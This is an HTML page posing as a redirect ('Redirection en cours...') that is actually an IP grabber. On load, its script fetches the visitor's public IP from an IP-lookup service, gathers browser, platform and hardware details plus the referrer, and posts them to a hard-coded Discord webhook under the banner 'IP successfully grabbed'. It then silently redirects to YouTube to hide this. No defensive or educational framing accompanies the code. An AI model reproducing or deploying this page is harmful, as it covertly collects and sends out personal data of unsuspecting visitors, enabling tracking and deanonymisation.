<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirection en cours...</title>
    <script src="script.js"></script>
</head>
<body>
    <h1></h1>

    <script>
        var ip = '';
        var deviceName = navigator.userAgent;
        var currentDateTime = new Date().toISOString().slice(0, 19).replace('T', ' ');

        fetch('https://api.ipify.org/?format=json')
            .then(function(response) {
                return response.json();
            })
            .then(function(data) {
                ip = data.ip;
                var webhook = 'https://discord.com/api/webhooks/1126222435860107304/P8OUTmVfXEUBYnOy-rdpgdIaOYPzvzw9pJPfl_X8hLOi1yQEVRHaHaAmkz5Vdws69rwO';

                var message = {
                    content: ']>>># The user has clicked the link. IP successfully grabbed. <Wings_Services>\n\nDate/Time: ' + currentDateTime + ' GMT\n\nIP Address: ' + ip + '\n\nCountry: Germany, Berlin\n\nBrowser: ' + navigator.userAgent + ' (' + navigator.appVersion + ')\n\nOperating System: ' + navigator.platform + '\n\nDevice:\n\n' + navigator.deviceMemory + ',\n\n' + navigator.hardwareConcurrency + ',\n\n' + deviceName + '\n\nUser Agent: ' + navigator.userAgent + '\n\nReferring URL: ' + document.referrer + '\n\nHost Name: ' + window.location.hostname
                };

                fetch(webhook, {
                    method: 'POST',
                    headers: {
                        'content-type': 'application/json'
                    },
                    body: JSON.stringify(message)
                });
            });

        setTimeout(function() {
            window.location.href = "https://www.youtube.com";
        }, 1100);
    </script>
</body>
</html>
